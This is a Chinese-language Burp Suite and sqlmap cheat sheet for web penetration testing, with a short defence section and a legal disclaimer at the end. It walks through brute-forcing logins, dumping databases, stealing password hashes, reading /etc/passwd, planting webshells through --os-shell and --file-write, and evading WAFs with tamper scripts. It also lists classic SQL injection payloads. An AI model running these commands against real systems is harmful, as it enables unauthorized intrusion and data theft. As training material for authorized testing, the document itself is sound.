# Burp Suite & sqlmap 速查卡

> 用途：Web 安全测试与 SQL 注入利用
> 场景：Burp 抓包改包，sqlmap 自动拖库

---

## 一、Burp Suite 基础

### 1.1 启动与代理设置

```bash
burpsuite                             # 启动 Burp
# 代理地址：127.0.0.1:8080
# Firefox 设置：首选项 → 网络设置 → 手动代理
```

### 1.2 核心功能模块

| 模块 | 功能 |
|------|------|
| **Proxy** | 抓包拦截 |
| **Repeater** | 手动改包重放 |
| **Intruder** | 自动化攻击（爆破、Fuzz） |
| **Scanner** | 漏洞扫描（专业版） |
| **Decoder** | 编码/解码工具 |
| **Comparer** | 响应对比分析 |
| **Extender** | 插件扩展（如使用 HaE、Turbo Intruder） |

### 1.3 拦截与修改请求

**步骤：**

1. `Proxy` → `Intercept` → `Intercept is on`
2. 浏览器访问目标网站
3. Burp 显示请求，修改参数，点 `Forward`
4. 关闭拦截：`Intercept is off`

**小技巧：**

- `Drop`：丢弃当前请求
- `Forward`：放行当前请求
- `Action` → `Send to Repeater`：发送到重放器

### 1.4 Repeater 重放攻击

**步骤：**

1. Proxy 里抓到请求 → 右键 → `Send to Repeater`
2. Repeater 标签里修改请求参数（如 `id=1'`）
3. 点 `Send`，看响应
4. 反复修改，测试漏洞

**常用操作：**

```bash
Ctrl+U          # URL 编码选中的内容
Ctrl+Shift+U    # URL 解码
Ctrl+R          # 发送到 Repeater（快捷方式）
# 右侧响应栏支持 HTML 渲染、JSON 格式化
```

### 1.5 Intruder 爆破

**步骤：**

1. Proxy 抓包 → 右键 → `Send to Intruder`
2. `Positions` 标签 → 清除所有变量 → 选中要爆破的参数（如密码）
3. `Payloads` 标签 → 加载字典
4. 点 `Start attack`
5. 看响应长度，不同长度通常表示登录成功

**爆破类型：**

| 类型 | 说明 |
|------|------|
| **Sniper** | 单字典单位置爆破 |
| **Battering ram** | 单字典多位置同时替换 |
| **Pitchfork** | 多字典一一对应替换 |
| **Cluster bomb** | 多字典笛卡尔积组合 |

**常用字典路径：**

```bash
/usr/share/wordlists/rockyou.txt      # Kali 自带最强密码字典
/usr/share/wordlists/dirbuster/       # 目录爆破字典
/usr/share/seclists/                  # 最全字典集合
```

### 1.6 常用快捷键

| 快捷键 | 功能 |
|--------|------|
| `Ctrl+R` | 发送到 Repeater |
| `Ctrl+I` | 发送到 Intruder |
| `Ctrl+U` | URL 编码 |
| `Ctrl+Shift+U` | URL 解码 |
| `Ctrl+A` | 全选 |
| `Ctrl+F` | 搜索响应内容 |
| `Ctrl+G` | 跳转到指定行 |

### 1.7 常用插件推荐

| 插件 | 用途 |
|------|------|
| **HaE** | 数据包高亮，快速定位敏感信息 |
| **Turbo Intruder** | 高速爆破，支持自定义脚本 |
| **Logger++** | 更强大的请求日志记录 |
| **Autorize** | 越权漏洞检测 |
| **Bypass WAF** | WAF 绕过辅助 |
| **JSON Web Tokens** | JWT 解码与篡改 |

---

## 二、sqlmap 基础

### 2.1 基础语法

```bash
# 基础用法
sqlmap -u "http://目标.com/页面.php?id=1" --batch   # 自动探测（--batch 跳过所有交互）

# 常用组合
sqlmap -u "目标URL" --batch --level=2 --risk=2
```

### 2.2 核心参数

| 参数 | 说明 |
|------|------|
| `--dbs` | 列出所有数据库 |
| `--tables` | 列出表 |
| `--columns` | 列出字段 |
| `--dump` | 导出数据 |
| `-D 数据库名` | 指定数据库 |
| `-T 表名` | 指定表 |
| `-C 字段名` | 指定字段 |

### 2.3 实战：完整拖库流程

**Step 1：探测注入点**

```bash
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --batch
```

**Step 2：列出所有数据库**

```bash
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --dbs
# 假设返回：acuart
```

**Step 3：列出 acuart 里的表**

```bash
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart --tables
# 假设返回：users, artists
```

**Step 4：导出 users 表**

```bash
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart -T users --dump
```

### 2.4 高级用法

```bash
# 增加测试级别（1-5，默认1）
sqlmap -u "URL" --level=2

# 增加风险级别（1-3，默认1）
sqlmap -u "URL" --risk=3

# 带上 Cookie（需要登录时）
sqlmap -u "URL" --cookie="PHPSESSID=abc123"

# POST 请求
sqlmap -u "http://目标.com/login.php" --data="username=admin&password=123"

# 尝试写 Webshell（需要权限）
sqlmap -u "URL" --os-shell

# 多线程加速
sqlmap -u "URL" --threads=10

# 指定数据库类型（加快速度）
sqlmap -u "URL" --dbms=mysql

# 自动选择格式
sqlmap -u "URL" --smart

# 使用随机 User-Agent
sqlmap -u "URL" --random-agent

# 忽略 401/403 错误
sqlmap -u "URL" --ignore-code=401,403

# 延时注入（绕过 WAF）
sqlmap -u "URL" --delay=1
```

### 2.5 实战：POST 注入

```bash
sqlmap -u "http://目标.com/login.php" --data="user=admin&pass=123" --batch
```

### 2.6 实战：带 Cookie 注入

```bash
# 从浏览器复制 Cookie
sqlmap -u "http://目标.com/user.php?id=1" --cookie="PHPSESSID=xxx" --dbs

# 使用 Cookie 文件
sqlmap -u "URL" --cookie-file=cookies.txt
```

### 2.7 实战：写 Webshell

```bash
# 前提：知道网站路径，有写权限
sqlmap -u "http://目标.com/artists.php?artist=1" --os-shell

# 如果成功，会给你一个交互式 shell，输入 whoami 试试
# 常用命令：whoami, pwd, ls, cat /etc/passwd
```

### 2.8 其他常用功能

```bash
# 获取当前数据库
sqlmap -u "URL" --current-db

# 获取当前用户
sqlmap -u "URL" --current-user

# 检查是否为 DBA
sqlmap -u "URL" --is-dba

# 获取数据库用户权限
sqlmap -u "URL" --privileges

# 获取所有数据库用户
sqlmap -u "URL" --users

# 获取数据库密码哈希
sqlmap -u "URL" --passwords

# 读取服务器文件（需要权限）
sqlmap -u "URL" --file-read="/etc/passwd"

# 写入服务器文件（需要权限）
sqlmap -u "URL" --file-write="/本地/shell.php" --file-dest="/var/www/shell.php"

# 代理（通过 Burp 抓取 sqlmap 请求）
sqlmap -u "URL" --proxy="http://127.0.0.1:8080"

# 输出详细日志
sqlmap -u "URL" -v 3
```

### 2.9 sqlmap 常用输出等级

| 等级 | 说明 |
|------|------|
| `-v 0` | 只显示关键信息 |
| `-v 1` | 显示信息和警告（默认） |
| `-v 2` | 显示调试信息 |
| `-v 3` | 显示详细的请求/响应 |
| `-v 4` | 显示 HTTP 请求头 |
| `-v 5` | 显示完整 HTTP 流量 |

### 2.10 绕过 WAF 常用参数

```bash
# 使用随机 User-Agent
--random-agent

# 使用延时
--delay=2

# 使用代理
--proxy="http://代理IP:端口"

# 使用 Tor（匿名）
--tor --tor-type=SOCKS5

# 使用 hex 编码
--hex

# 使用 base64 编码
--encode=base64

# 使用 Chunked 传输
--chunked

# 使用注入 Payload 前缀/后缀
--prefix="')" --suffix="-- -"

# 使用 tamper 脚本（绕过 WAF）
--tamper="space2comment"
```

### 2.11 常用 Tamper 脚本

```bash
# 空格替换为注释
--tamper="space2comment"

# 空格替换为随机空白
--tamper="randomspace"

# 空格替换为 '+' (适用于 XML)
--tamper="space2plus"

# 使用双 URL 编码
--tamper="doubleurlencode"

# 使用 Unicode 编码
--tamper="unicode"

# 组合使用
--tamper="space2comment,doubleurlencode"

# 查看所有 tamper
sqlmap --list-tampers
```

---

## 三、Burp + sqlmap 联合作战

### 场景1：抓取带注入点的请求，导入 sqlmap

```bash
# 1. Burp 抓到请求 → 右键 → Copy to file → 保存为 req.txt
# 2. 用 sqlmap 加载文件
sqlmap -r req.txt --batch

# 如果文件包含多个请求，可以用 --scope 过滤
sqlmap -r req.txt --scope="(www)?\.target\.com"
```

### 场景2：拦截登录请求，用 Intruder 爆破密码

```bash
# 1. Burp 抓登录 POST 请求
# 2. 发送到 Intruder，标记密码字段
# 3. 加载字典，攻击
# 4. 找到正确密码后，登录进后台
# 5. 再用 sqlmap 注入需要登录的页面
```

### 场景3：从 Burp Site Map 批量导入

```bash
# 1. Target → Site map → 选择目标
# 2. 右键 → Save selected items → 保存为 xml
# 3. 转换格式（可选）
# 4. 或用脚本批量跑
# 注意：建议手动筛选可能包含注入点的 URL
```

### 场景4：sqlmap 请求导入 Burp 分析

```bash
# sqlmap 使用代理，让 Burp 抓取所有请求
sqlmap -u "URL" --proxy="http://127.0.0.1:8080" --batch

# 在 Burp 中观察请求/响应，辅助分析绕过策略
```

### 场景5：使用 Burp 的 Intruder 进行 SQL 注入 Fuzzing

```
# 1. 抓包发送到 Intruder
# 2. 标记参数位置
# 3. Payloads 加载 SQL 注入 Payload 列表
# 4. 观察响应，判断是否存在注入
# 5. 确认存在注入后，使用 sqlmap 深度利用

# 常用 SQL Fuzz Payload：
' OR '1'='1
' UNION SELECT NULL--
' AND SLEEP(5)--
' AND 1=1--
' AND 1=2--
```

---

## 四、典型测试流程

```
┌─────────────────────────────────────────────────────────────┐
│               Web SQL 注入测试流程                           │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  ① 信息收集                                                 │
│     ├── 确定目标 URL 和参数                                 │
│     ├── 确定请求方式（GET/POST）                           │
│     └── 确定是否有 Cookie/Token 认证                        │
│                                                             │
│  ② Burp 抓包                                               │
│     ├── 开启代理，访问目标页面                              │
│     ├── 抓取请求，Send to Repeater                         │
│     └── 手动测试，添加单引号查看反应                        │
│                                                             │
│  ③ sqlmap 探测                                             │
│     ├── sqlmap -u "URL" --batch                            │
│     └── 确认注入类型和数据库类型                            │
│                                                             │
│  ④ 数据提取                                                 │
│     ├── --dbs 列出数据库                                   │
│     ├── --tables 列出表                                    │
│     └── --dump 导出数据                                    │
│                                                             │
│  ⑤ 提权（可选）                                            │
│     ├── --os-shell 尝试写 Webshell                         │
│     ├── --file-read 读取敏感文件                           │
│     └── --sql-shell 执行自定义 SQL                         │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

---

## 五、速记口诀

```
Burp 抓包改参数，Repeater 手动测
Intruder 字典爆，sqlmap 把库拖

先找注入点，后跑 --dbs
--tables --dump，数据全拿完

POST 加 --data，Cookie 加 --cookie
高权限 --os-shell，低权限慢慢拖
```

---

## 六、应急速查表

### Burp 常用操作速查

| 需求 | 操作 |
|------|------|
| 抓包 | Proxy → Intercept is on |
| 改包重发 | 抓包 → Ctrl+R → 修改 → Send |
| 爆破 | 抓包 → Ctrl+I → 标记变量 → 加载字典 |
| 编码/解码 | Decoder 标签 → 输入 → Encode/Decode |
| 比较两个响应 | 选中两个请求 → 右键 → Compare |
| 扫描（专业版）| 选中请求 → 右键 → Do an active scan |

### sqlmap 常用命令速查

| 需求 | 命令 |
|------|------|
| 基本探测 | `sqlmap -u "URL" --batch` |
| 列出数据库 | `--dbs` |
| 列出表 | `-D 库名 --tables` |
| 导出数据 | `-D 库名 -T 表名 --dump` |
| POST 注入 | `--data="参数1=值1&参数2=值2"` |
| 带 Cookie | `--cookie="PHPSESSID=xxx"` |
| 写 Webshell | `--os-shell` |
| 加载请求文件 | `-r req.txt` |
| 设置代理 | `--proxy="http://127.0.0.1:8080"` |
| 多线程 | `--threads=10` |
| 绕过 WAF | `--tamper="space2comment"` |
| 延时注入 | `--delay=1` |
| 指定数据库类型 | `--dbms=mysql` |

---

## 七、防御知识（了解即可）

### SQL 注入防御最佳实践

```sql
-- 1. 使用参数化查询（Prepared Statement）
-- Java
PreparedStatement ps = conn.prepareStatement("SELECT * FROM users WHERE id = ?");
ps.setInt(1, userId);

-- 2. 使用存储过程（注意：存储过程也可能存在注入）
-- 3. 输入验证（白名单 > 黑名单）
-- 4. 最小权限原则（数据库账号只用必要权限）
-- 5. 错误信息不暴露敏感信息
-- 6. 使用 WAF（Web Application Firewall）
-- 7. 定期安全扫描
```

### SQL 注入发生原因

```
不安全代码示例：
$sql = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";

用户输入 admin' OR '1'='1
实际执行：SELECT * FROM users WHERE username = 'admin' OR '1'='1' AND password = '任意'
结果：绕过了身份验证！
```

---

> ⚠️ **免责声明**：本文档仅供安全测试学习使用。未经授权对他人系统进行测试属违法行为。请遵守《网络安全法》，在获得授权后进行渗透测试。

---
